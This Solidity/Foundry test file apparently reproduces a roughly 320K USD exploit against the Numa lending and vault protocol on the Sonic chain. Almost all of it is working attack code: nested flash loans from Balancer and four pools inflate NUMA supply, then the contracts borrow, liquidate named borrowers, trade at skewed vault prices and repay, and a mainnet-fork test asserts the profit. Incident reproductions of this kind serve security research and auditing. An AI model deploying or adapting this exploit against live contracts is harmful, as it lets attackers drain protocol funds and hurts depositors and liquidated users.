// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost: ~320K USD
// Attacker: https://sonicscan.org/address/0xef1df44e122872d0fef75644afc63a5c35f97674
// Attack Tx: https://sonicscan.org/tx/0x56abdbc84232658617853f233f52e6b4c855129c7ab163a588c2bac62ea30408
//
// Numa's vault pricing used NUMA totalSupply while flash-loaned NUMA was still
// circulating. Nested flash loans inflated supply, allowing the attacker to
// borrow and liquidate against inconsistent prices, then buy and sell NUMA at
// favorable vault rates before repaying every loan.

interface INumaBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IUniV3FlashPool {
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IShadowFlashPool {
    function flash(
        address recipient,
        address token,
        uint256 amount,
        bytes calldata data
    ) external;
}

interface ICToken {
    function mint(
        uint256 amount
    ) external returns (uint256);
    function borrow(
        uint256 amount
    ) external returns (uint256);
}

interface INumaComptroller {
    function enterMarkets(
        address[] calldata markets
    ) external returns (uint256[] memory);
}

interface INumaVault {
    function liquidateLstBorrower(
        address borrower,
        uint256 repayAmount,
        bool,
        bool
    ) external;
    function buy(
        uint256 lstAmount,
        uint256 minNumaAmount,
        address receiver
    ) external returns (uint256);
    function sell(
        uint256 numaAmount,
        uint256 minLstAmount,
        address receiver
    ) external returns (uint256);
}

interface ISyntheticManager {
    function mintAssetFromNumaInput(
        address asset,
        uint256 numaAmount,
        uint256 minAssetAmount,
        address receiver
    ) external returns (uint256);

    function burnAssetInputToNuma(
        address asset,
        uint256 assetAmount,
        uint256 minNumaAmount,
        address receiver
    ) external returns (uint256);
}

contract NumaLiquidator {
    IERC20 private constant LST = IERC20(0xE5DA20F15420aD15DE0fa650600aFc998bbE3955);
    IERC20 private constant NUMA = IERC20(0x83a6d8D9aa761e7e08EBE0BA5399970f9e8F61D9);
    INumaVault private constant VAULT = INumaVault(0xde76288C3B977776400fE44Fe851bBe2313f1806);

    address private immutable controller;

    constructor() {
        controller = msg.sender;
        LST.approve(address(VAULT), type(uint256).max);
        NUMA.approve(address(VAULT), type(uint256).max);
    }

    function liquidate(
        address borrower,
        uint256 amount
    ) external {
        require(msg.sender == controller, "not controller");
        VAULT.liquidateLstBorrower(borrower, amount, false, false);
    }

    function returnLst() external {
        require(msg.sender == controller, "not controller");
        LST.transfer(controller, LST.balanceOf(address(this)));
    }

    function sellNuma(
        uint256 amount
    ) external {
        require(msg.sender == controller, "not controller");
        VAULT.sell(amount, 1, address(this));
        LST.transfer(controller, LST.balanceOf(address(this)));
    }

    function numaBalance() external view returns (uint256) {
        return NUMA.balanceOf(address(this));
    }
}

contract NumaAttacker {
    INumaBalancerVault private constant BALANCER = INumaBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 private constant LST = IERC20(0xE5DA20F15420aD15DE0fa650600aFc998bbE3955);
    IERC20 private constant NUMA = IERC20(0x83a6d8D9aa761e7e08EBE0BA5399970f9e8F61D9);
    IERC20 private constant NUBTC = IERC20(0xcDB2b78E83Ddf230BcB225F8C541dCa4a15f3A85);
    IERC20 private constant USDC = IERC20(0x29219dd400f2Bf60E5a23d13Be72B486D4038894);

    IUniV3FlashPool private constant POOL_1 = IUniV3FlashPool(0xE8d01e7d77c5df338D39Ac9F1563502127Dd3301);
    IUniV3FlashPool private constant POOL_2 = IUniV3FlashPool(0xD3533de03cDc475d0dd1AAa8971128a4B69a6141);
    IUniV3FlashPool private constant POOL_3 = IUniV3FlashPool(0x2143f979A765f25B904FFB0b7420f153864ec670);
    IShadowFlashPool private constant POOL_4 = IShadowFlashPool(0x652BcB8193745b2F527275A337eF835735b2191E);

    ICToken private constant C_NUMA = ICToken(0x16d4b53DE6abA4B68480C7A3B6711DF25fcb12D7);
    ICToken private constant C_LST = ICToken(0xb2a43445B97cd6A179033788D763B8d0c0487E36);
    INumaComptroller private constant COMPTROLLER = INumaComptroller(0x30047CCA309b7aaC3613ae5B990Cf460253c9b98);
    INumaVault private constant VAULT = INumaVault(0xde76288C3B977776400fE44Fe851bBe2313f1806);
    ISyntheticManager private constant SYNTH = ISyntheticManager(0xAA2475Ec557C18F5B3289c393899483E42D0C585);

    uint256 private constant BALANCER_LOAN = 1_200_000 ether;
    uint256 private constant POOL_1_LOAN = 68_347_688_178_007_608_677_613;
    uint256 private constant POOL_2_LOAN = 7_497_713_836_189_185_512_820;
    uint256 private constant POOL_3_LOAN = 19_952_351_221_087_760_437_822;
    uint256 private constant POOL_4_LOAN = 24_236_648_523_433_500_209_963;

    NumaLiquidator private immutable liquidator;

    constructor() {
        liquidator = new NumaLiquidator();
        NUMA.approve(address(C_NUMA), type(uint256).max);
        NUMA.approve(address(SYNTH), type(uint256).max);
        NUMA.approve(address(VAULT), type(uint256).max);
        NUBTC.approve(address(SYNTH), type(uint256).max);
        LST.approve(address(VAULT), type(uint256).max);
        USDC.approve(address(POOL_4), type(uint256).max);
    }

    function attack() external {
        address[] memory markets = new address[](1);
        markets[0] = address(C_NUMA);
        COMPTROLLER.enterMarkets(markets);

        address[] memory tokens = new address[](1);
        tokens[0] = address(LST);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = BALANCER_LOAN;
        BALANCER.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        require(msg.sender == address(BALANCER), "not Balancer");
        POOL_1.flash(address(this), 0, POOL_1_LOAN, "");
        LST.transfer(address(BALANCER), amounts[0] + feeAmounts[0]);
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata
    ) external {
        if (msg.sender == address(POOL_1)) {
            POOL_2.flash(address(this), 0, POOL_2_LOAN, "");
            NUMA.transfer(address(POOL_1), POOL_1_LOAN + fee1);
        } else if (msg.sender == address(POOL_2)) {
            POOL_3.flash(address(this), POOL_3_LOAN, 0, "");
            NUMA.transfer(address(POOL_2), POOL_2_LOAN + fee1);
        } else {
            require(msg.sender == address(POOL_3), "unknown pool");
            POOL_4.flash(address(this), address(NUMA), POOL_4_LOAN, "");
            NUMA.transfer(address(POOL_3), POOL_3_LOAN + fee0);
        }
    }

    function callback(
        bytes calldata
    ) external {
        require(msg.sender == address(POOL_4), "not Shadow");

        C_NUMA.mint(19_205_504_281_394_888_774_114);
        C_LST.borrow(138_290_197_864_237_351_549_984);
        SYNTH.mintAssetFromNumaInput(address(NUBTC), 100_828_897_477_323_166_064_104, 1, address(this));

        LST.transfer(address(liquidator), LST.balanceOf(address(this)));
        liquidator.liquidate(0x6B9d3797d0c1Ee9824acBE456365cF02b5B87d5E, 7_305_295_333_407_810_840_425);
        liquidator.liquidate(0x2F9A0BB9a50C85B1163B70B6cdf437881892F4CF, 18_522_340_687_514_765_427_359);
        liquidator.liquidate(0x2C7F65dFaa81117E759792267e156D7E0759fC8e, 6_955_162_447_323_523_896_264);
        liquidator.liquidate(0x6122861A8Cc736d98caD0506df5d0618429cF490, 49_345_723_095_369_857_610_637);
        liquidator.liquidate(address(this), 39_829_885_413_811_155_609_288);
        liquidator.returnLst();

        VAULT.buy(700_000 ether, 1, address(this));
        SYNTH.burnAssetInputToNuma(address(NUBTC), NUBTC.balanceOf(address(this)), 1, address(this));
        liquidator.sellNuma(58_806_915_516_448_111_258_537);
        VAULT.sell(112_110_025_829_455_202_684_726, 1, address(this));

        NUMA.transfer(address(POOL_4), POOL_4_LOAN);
    }

    function profit() external view returns (uint256) {
        return LST.balanceOf(address(this));
    }
}

contract NumaExploitTest is Test {
    address private constant LST = 0xE5DA20F15420aD15DE0fa650600aFc998bbE3955;
    address private constant USDC = 0x29219dd400f2Bf60E5a23d13Be72B486D4038894;
    uint256 private constant FORK_BLOCK = 42_371_318;

    function setUp() public {
        vm.createSelectFork("https://rpc.soniclabs.com", FORK_BLOCK);
    }

    function testExploit() public {
        NumaAttacker attacker = new NumaAttacker();
        deal(USDC, address(attacker), 10_000_000);

        attacker.attack();

        uint256 profit = attacker.profit();
        emit log_named_decimal_uint("LST profit", profit, 18);
        assertGt(profit, 0);
        assertEq(IERC20(LST).balanceOf(address(attacker)), profit);
    }
}
